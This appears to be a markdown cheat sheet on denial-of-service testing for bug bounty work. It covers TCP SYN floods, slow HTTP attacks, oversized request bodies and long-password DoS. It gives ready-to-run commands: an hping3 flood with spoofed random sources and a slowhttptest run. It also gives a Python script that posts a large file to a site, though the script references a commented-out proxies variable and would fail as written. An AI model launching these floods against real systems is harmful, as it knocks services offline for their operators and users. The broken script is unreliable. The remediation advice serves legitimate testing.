## 1) TCP SYN FLOOD DOS ATTACK
DoS attacks are simple to carry out, can cause serious downtime, and aren’t always obvious. In a SYN flood attack, a malicious party exploits the TCP protocol 3-way handshake to quickly cause service and network disruptions, ultimately leading to an Denial of Service (DoS) Attack. These type of attacks can easily take admins by surprise and can become challenging to identify. Luckily tools like Wireshark makes it an easy process to capture and verify any suspicions of a DoS Attack.

### HOW TCP SYN FLOOD ATTACKS WORK
When a client attempts to connect to a server using the TCP protocol e.g (HTTP or HTTPS), it is first required to perform a three-way handshake before any data is exchanged between the two. Since the three-way TCP handshake is always initiated by the client it sends a SYN packet to the server.

![image](https://user-images.githubusercontent.com/63053441/200159004-f6e1bddb-6629-47d5-a793-41f035a0ddfa.png)

The server next replies acknowledging the request and at the same time sends its own SYN request – this is the SYN-ACK packet. The finally the client sends an ACK packet which confirms both two hosts agree to create a connection. The connection is therefore established and data can be transferred between them.


In a SYN flood, the attacker sends a high volume of SYN packets to the server using spoofed IP addresses causing the server to send a reply (SYN-ACK) and leave its ports half-open, awaiting for a reply from a host that doesn’t exist:

![image](https://user-images.githubusercontent.com/63053441/200159205-2735b7d0-5540-42cb-ad1e-23f7ceba9b4c.png)

![image](https://user-images.githubusercontent.com/63053441/200159015-42f5ca86-1c89-480d-9b7a-038315764e61.png)

In a simpler, direct attack (without IP spoofing), the attacker will simply use firewall rules to discard SYN-ACK packets before they reach him. By flooding a target with SYN packets and not responding (ACK), an attacker can easily overwhelm the target’s resources. In this state, the target struggles to handle traffic which in turn will increase CPU usage and memory consumption ultimately leading to the exhaustion of its resources (CPU and RAM). At this point the server will no longer be able to serve legitimate client requests and ultimately lead to a Denial-of-Service.


### How To Test TCP SYN FLOOD DOS ATTACK?
However, to test if you can detect this type of a DoS attack, you must be able to perform one. The simplest way is via a Kali Linux and more specifically the hping3, a popular TCP penetration testing tool included in Kali Linux.

Alternatively Linux users can install hping3 in their existing Linux distribution using the command:

`sudo apt-get install hping3`

In most cases, attackers will use hping or another tool to spoof IP random addresses, so that’s what we’re going to focus on.  The line below lets us start and direct the SYN flood attack to our target (192.168.1.159): 

`hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159`

![image](https://user-images.githubusercontent.com/63053441/200159063-df24f0c9-c234-4821-a2ee-0e81a7c4ddca.png)

Let’s explain in detail the above command:

We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP addresses to disguise the real source and avoid detection but at the same time stop the victim’s SYN-ACK reply packets from reaching the attacker.


## 2) Slow HTTP GET/POST Vulnerability

Slow HTTP attacks are denial-of-service (DoS) attacks that rely on the fact that the HTTP protocol, by design, requires a request to be completely received by the server before it is processed. If an HTTP request is not complete, or if the transfer rate is very low, the server keeps its resources busy waiting for the rest of the data. When the server’s concurrent connection pool reaches its maximum, this creates a denial of service. These attacks are problematic because they are easy to execute, i.e. they can be executed with minimal resources from the attacking machine.

`sudo apt install slowhttptest`

`slowhttptest -c 10000 -H -g -o slowhttp -i 1 -r 2000 -t GET -u https://example.com -x 2400 -p 3`

## 3) Big entity

Try sending a big request to the server. You can do it by send request with POST method to root with custom parameter or try in other fields like password or uploaders file name.
  ### 3.1) Python Script to send large file (a.txt with 100mg) as parameter to root directory:
```
import requests
import time

from requests.models import Response
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # If you want to see request in proxy server like Burp

session = requests.session()
f=open('a.txt','r').read()
#f=open(r'C:\Users\User\Desktop\dos\a.txt').read()   # Same to above line
burp0_url = "http://www.site.com/"
burp0_cookies = {"_ga": "GA1.2.1958363218.1640679715", "APPNNPS": "0emjb3ejnh1xxsnz025rhwvt"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://www.site.com/", "Upgrade-Insecure-Requests": "1"}
burp0_data = f
start = time.time()
response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False)
print(response)
print(f'Time: {time.time() - start}')

```
  If Server is processing our request for long time and doesn't give time out to us, it's vulnerable.
  
  ### 3.2) Long password denial of service:
  By sending a very long password (1.000.000 characters) it's possible to cause a denial a service attack on the server. This may lead to the website becoming    unavailable or unresponsive. Usually this problem is caused by a vulnerable password hashing implementation. When a long password is sent, the password hashing process will result in CPU and memory exhaustion.

  This vulnerability was detected by sending passwords with various lengths and comparing the measured response times. Consult details for more information.
  
  you can find this at many places like :

  - Username
  - Firstname or Lastname
  - Email Address (create your own email using temp-mail)
  - Address
  - Text-Area
  - Comment Section
  
  #### Remediation:
  The password hashing implementation must be fixed to limit the maximum length of accepted passwords.
  As in most systems there is a policy for the minimum number of characters, this limit should also exist for the maximum number of characters.

  https://www.acunetix.com/vulnerabilities/web/long-password-denial-of-service/
  
  How to found this vulnerability :

  1. Go to https://privateprogram.com/signup
  2. Fill the form and enter a long string in password
  3. Click on enter and you’ll get 500 Internal Server error if it is vulnerable:
  
  ![image](https://user-images.githubusercontent.com/63053441/200264593-ec1cfb7c-2f1b-4c5d-9701-65d2c3e0beed.png)

  Also you must check you can login in program with that long password or not! (Is that password accepted from server?)
  Now many a times it happens that the signup page is not vulnerable to Long String Dos so you can try it while resetting your password.


  #### NOTE : 
  This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them.
  
  https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0
  
  https://cwe.mitre.org/data/definitions/400.html
  
